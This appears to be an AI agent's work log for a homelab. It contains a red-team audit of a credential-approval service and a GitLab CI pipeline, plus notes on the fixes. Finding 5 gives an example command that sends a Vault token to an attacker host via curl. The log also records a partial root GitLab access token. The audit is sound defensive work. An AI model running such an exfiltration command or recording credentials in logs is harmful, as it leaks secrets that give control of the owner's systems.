
## 01:26 â€” Red Team Audit: JIT Service + CI/CD Token Exposure

### Finding 1: No Size Cap on Request Store â€” **Medium**
**File:** `docker/jit-approval-svc/internal/store/store.go`
**Issue:** The in-memory `requests` map grows unbounded. `Cleanup()` runs every 5 min and removes resolved requests >1h old, but **pending requests are never removed** by cleanup (explicit check: `req.Status != StatusPending`). An attacker with a valid API key could flood `/request` with T2 requests (require manual approval), and they'd remain in memory forever since they never get resolved unless Noah clicks approve/deny.
**Status:** NOT FIXED from prior audit. The `Cleanup` function still skips pending requests.
**Attack:** DoS via memory exhaustion â€” send thousands of T2 requests. Each spawns a `watchTimeout` goroutine (5 min timer), compounding goroutine+memory pressure.
**Fix:** Add `maxRequests` cap (e.g., 1000). Reject new requests when exceeded. Also, `Cleanup` should remove ancient pending requests (>1h pending = dead).

### Finding 2: Webhook Secret Comparison is NOT Constant-Time â€” **High**
**File:** `docker/jit-approval-svc/internal/handler/handler.go:178`
**Code:** `secretHeader != h.cfg.TelegramWebhookSecret` â€” plain `!=` string comparison.
**Issue:** Timing side-channel. An attacker who can bypass the nginx CIDR allowlist (or is on the internal network) could use timing analysis to brute-force the webhook secret character by character.
**Fix:** Use `crypto/subtle.ConstantTimeCompare([]byte(secretHeader), []byte(h.cfg.TelegramWebhookSecret))`.

### Finding 3: API Key Comparison is NOT Constant-Time â€” **High**
**File:** `docker/jit-approval-svc/internal/handler/handler.go:76,133`
**Code:** `apiKey != h.cfg.JITAPIKey` â€” same issue as Finding 2.
**Fix:** Use `crypto/subtle.ConstantTimeCompare` for the JIT API key check too.

### Finding 4: Callback Replay â€” Mitigated but Imperfect â€” **Low**
**File:** `handler.go:processCallback()`
**Analysis:** The code checks `req.Status != StatusPending` before processing, so replaying an already-approved callback is a no-op. âœ… Good.
**Residual risk:** Telegram callback_query IDs are not tracked/deduplicated. If Telegram retries a webhook delivery for the same callback, and the first delivery was slow (race window between status check and approval), there's a theoretical TOCTOU race. Practically very low risk given the mutex in store.
**Status:** Acceptable.

### Finding 5: CI/CD VAULT_TOKEN Can Read ALL Secrets â€” **Critical**
**File:** `.gitlab-ci.yml` â€” `vault:configure` and `vault:validate` jobs
**Issue:** The `VAULT_TOKEN` CI/CD variable is used in `terraform plan/apply` with full Vault access. Key observations:
- `vault:validate` runs on **MR pipelines** (`$CI_PIPELINE_SOURCE == "merge_request_event"`)
- It first tries JWT auth (`vault-read` role), but **falls back to `$VAULT_TOKEN`** if JWT fails
- If `VAULT_TOKEN` is a **protected variable**, MR pipelines on unprotected branches won't have it â†’ JWT fallback is the only path. This is SAFE if configured correctly.
- **BUT:** If `VAULT_TOKEN` is NOT protected, any MR pipeline can access it. A malicious MR could modify the `vault:validate` script to exfiltrate `$VAULT_TOKEN` (e.g., `curl https://attacker.com/$VAULT_TOKEN`).
- `ROUTER_PRIVATE_KEY_BASE64` appears to be protected (the code checks if it's empty and gracefully degrades). Good pattern.
**Verdict:** Need to verify `VAULT_TOKEN` is marked as `protected` in GitLab CI/CD settings. If it is, this is mitigated. If not, it's **Critical**.
**Fix:** (1) Mark `VAULT_TOKEN` as protected + masked. (2) Better: eliminate `VAULT_TOKEN` entirely from validate â€” the JWT `vault-read` role should be sufficient; remove the fallback. (3) Consider removing MR pipeline access to vault:validate entirely if JWT isn't working yet.

### Finding 6: SSH Key Available to MR Pipelines â€” **Medium**
**File:** `.gitlab-ci.yml` â€” `.ansible` template
**Issue:** `ROUTER_PRIVATE_KEY_BASE64` is decoded into a file. The code does handle it being empty on unprotected branches, but if it were NOT protected, MR pipelines could SSH to the router as root.
**Status:** Appears to be protected (graceful degradation code suggests it's sometimes empty). Verify.

### Finding 7: Docker Build Uses Remote Docker Host Without TLS â€” **Medium**
**File:** `.gitlab-ci.yml` â€” `.docker_build` template
**Code:** `DOCKER_HOST: "tcp://10.4.32.2:2375"` â€” port 2375 = unencrypted Docker API.
**Issue:** No TLS verification. MITM on the management VLAN could intercept/modify builds. Also, any service on mgmt VLAN can talk to this Docker socket.
**Fix:** Use TLS (port 2376) with client certificates, or use Docker-in-Docker with socket.

### Finding 8: Nginx Telegram CIDR Allowlist â€” **Low (Incomplete)**
**File:** `docker/nginx/http-external-drop-in.conf`
**Configured CIDRs:**
- 91.108.56.0/22 âœ…
- 91.108.4.0/22 âœ…
- 91.108.8.0/22 âœ…
- 91.108.16.0/22 âœ…
- 91.108.12.0/22 âœ…
- 149.154.160.0/20 âœ…
- 91.105.192.0/23 âœ…
- 91.108.20.0/22 âœ…
- 185.76.151.0/24 âœ…

**Telegram docs say:** `149.154.160.0/20` and `91.108.4.0/22`. The config includes more specific subnets which is fine (superset coverage). The list looks comprehensive and matches known Telegram Bot API source ranges.
**Note:** Telegram warns these may change. Consider periodic automated verification.
**Verdict:** Allowlist looks correct and complete as of Feb 2026.

### Finding 9: Health Endpoint Unauthenticated â€” **Low**
**File:** `handler.go:HandleHealth()`
**Issue:** `/health` requires no API key. Exposes vault connection status and request count. Minor information disclosure.
**Fix:** Consider requiring API key for `/health` or returning minimal info to unauthenticated callers.

### Summary Table
| # | Finding | Severity | Status |
|---|---------|----------|--------|
| 1 | Unbounded request store (DoS) | Medium | NOT FIXED |
| 2 | Webhook secret not constant-time | High | NEW |
| 3 | API key not constant-time | High | NEW |
| 4 | Callback replay | Low | Mitigated |
| 5 | CI/CD VAULT_TOKEN exposure to MR pipelines | Critical* | VERIFY |
| 6 | SSH key exposure to MR pipelines | Medium | Likely protected |
| 7 | Docker build over unencrypted TCP | Medium | EXISTING |
| 8 | Telegram CIDR allowlist | Low | Complete |
| 9 | Unauthenticated /health | Low | EXISTING |

*Critical if VAULT_TOKEN is not a protected variable; Medium if it is.

### Recommended Priority Actions
1. **Verify `VAULT_TOKEN` is protected+masked in GitLab CI/CD settings** â€” if not, fix immediately
2. **Remove VAULT_TOKEN fallback from `vault:validate`** â€” JWT-only for MR pipelines
3. **Add `crypto/subtle.ConstantTimeCompare`** for both API key and webhook secret
4. **Add store size cap** (max 1000 requests, reject with 429 when full)
5. **Add pending request cleanup** in `Cleanup()` for requests pending >1h

## 10:00-18:45 â€” JIT Service Major Expansion + Testing

### JIT Webhook Fix (Root Cause Found)
- **Root cause:** nginx (external network 10.2.x.x) couldn't reach JIT service (internal 10.3.x.x) â€” different Docker networks
- **Fix:** MR !168 â€” added `jit-bridge` Docker network between nginx and jit-approval-svc
- **SSL cert** was also missing `jit-webhook.nkontur.com` but auto-renewed at 08:02 UTC
- **Webhook "clearing" mystery** was a red herring â€” webhook was set fine, but nginx timeouts made it look broken. The getWebhookInfo response parsing was also wrong on my part
- **Full e2e Telegram approval flow confirmed working** â€” all 11 services tested

### JIT Dynamic Backends Built
- **MR !169** â€” Dynamic GitLab project access tokens (merged, working)
  - Uses root PAT to mint scoped project access tokens
  - Initial failure: seeded a project bot token instead of real user PAT â€” project bots can't create tokens
  - Fixed by seeding root's PAT (`glpat-FgXQU1co...`)
- **MR !170** â€” Scoped GitLab tokens â€” callers specify `scopes: ["read_api"]` etc.
  - Tested: read_api works for reads, blocks writes with `insufficient_scope` âœ…
- **MR !172** â€” Added Tailscale (T2 dynamic), Prowlarr (T1 static), MQTT (T1 static), Pihole (T2 static)
- **MR !173** â€” Dynamic Vault backend with inline scoped policies ðŸ”¥
  - Requesters specify exact paths + capabilities
  - Service builds temporary Vault policy, mints scoped token, auto-cleans up
  - Security: paths must start with `homelab/data/`, only read/list/create/update, max 10 paths
  - Tested end-to-end: read allowed paths âœ…, denied unrequested paths âœ…, denied writes when only read requested âœ…
- **MR !174** â€” Merged T0 into T1. Tiers now represent approval trust, not backend type

### Vault Audit Logging
- **MR !171** â€” Enabled Vault file audit + Promtail shipping to Loki
- Confirmed working â€” can see all Vault operations in Loki with HMAC'd tokens

### Other MRs Created
- **!160** â€” Mosquitto image digest typo fix
- **!161** â€” Jackett update + image pinning
- **!162** â€” no-new-privileges on gitlab, pihole, zigbee2mqtt, wordpress_db
- **!163** â€” Separate root/app DB passwords
- **!164** â€” Document HA CAP_NET_ADMIN requirement
- **!165** â€” Backup monitoring alerts
- **!166** â€” Closed (Watchtower doesn't exist in stack)
- **!167** â€” JIT webhook self-registration on startup

### Operational
- Removed `open-mrs.json` tracking â€” query GitLab API directly instead
- Updated TOOLS.md with comprehensive JIT usage patterns for all services + Loki querying docs
- GitLab issues #44-#46 created by infra audit cron
- Red team audit: 9 findings including CI/CD VAULT_TOKEN exposure risk

### Key Lessons
- Docker cross-network communication is the most common "it's not working" issue â€” always check network topology first
- Project bot users (from project access tokens) have limited permissions â€” can't create other tokens
- Vault inline policies via temporary policy creation + orphan tokens = powerful dynamic access model
- Tiers should represent trust/approval level, not implementation details like backend type

## 18:58 â€” JIT Tier Correction
Noah corrected my stale mental model. After MR !174 merged T0 into T1:
- **T1 (auto-approve, 15min):** grafana (dynamic), influxdb (dynamic), plex, radarr, sonarr, ombi, nzbget, deluge, paperless (all static)
- **T2 (approval, 30min):** gitlab (dynamic), homeassistant (dynamic), vault (dynamic)
- **No T0 tier exists anymore**

Plan: move T1 static backends to direct Vault reads via moltbot-ops policy. JIT only for dynamic credential backends.
